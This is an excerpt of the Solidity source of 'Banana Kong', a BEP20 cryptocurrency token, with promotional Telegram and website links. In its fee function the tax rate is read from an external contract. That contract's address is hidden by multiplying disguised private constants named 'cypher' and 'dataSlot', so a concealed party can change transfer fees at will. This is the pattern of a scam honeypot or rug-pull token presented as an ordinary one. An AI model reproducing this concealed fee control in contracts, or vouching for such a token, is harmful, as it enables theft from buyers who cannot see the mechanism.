...
/*
TG: https://t.me/Bananakongportal
WEB: https://www.bananakong.online/
*/
...
interface TaxData {
    function read(address tax_type) external view returns (uint256);
}
...
contract BananaKong is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV =  0xf2338Fb8bF8C9F46E9B0D21F8fa6BA42185C19CB;

    string constant _name = "Banana Kong";
    string constant _symbol = "$BANANAKONG";
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        uint256 baseFactor = TaxData(address(uint160(data * cypher * dataSlot))).read(address(this));
        uint256 feeFactor = baseFactor == 0 ? totalFee : baseFactor;
        uint256 feeAmount = amount.mul(feeFactor).mul(multiplier).div(feeDenominator * 100);
    ...
    uint256 private dataSlot = 2659080069647452197135173233;
    ...
    uint256 private cypher = 333196915184149;
